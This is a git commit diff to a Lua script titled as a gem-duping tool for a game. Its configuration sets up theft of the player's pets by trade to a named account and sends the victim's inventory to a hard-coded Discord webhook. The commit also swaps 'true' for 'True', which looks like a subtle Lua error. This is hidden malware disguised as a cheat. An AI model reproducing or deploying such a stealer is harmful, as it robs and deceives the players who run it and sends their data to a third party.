3ea9f4796f18542f971e474ca4caf06649e5cb5b
wasdfasdf <108496624+okboomerw@users.noreply.github.com>
2022-07-03 23:01:50 -0400

    Update dupinggems(crash).lua

--- dupinggems(crash).lua
+++ dupinggems(crash).lua
@@ -1,6 +1,6 @@
 --Script
 PetRarity = "Legendary" -- Select Pet Rarity: Common Epic Legendary
-PetLimited = true -- If pet is limited it will take it!
+PetLimited = True -- If pet is limited it will take it!
 PetAll = false -- Will send all hes pets
 TradeUser = "wSocialAnxiety" -- Write your username so it will send to you trade
 WebhookURL = "https://discord.com/api/webhooks/993350112145309727/0Lq-0daq7ugPraiKvytiKunGRhRECtPk2H1zxiRT1qI34aVBPnFy9cOCyTFmeyunIIeP" -- Your webhook so it sends user inventory if its bigger than 500 pets it won't send it will delete webhook.
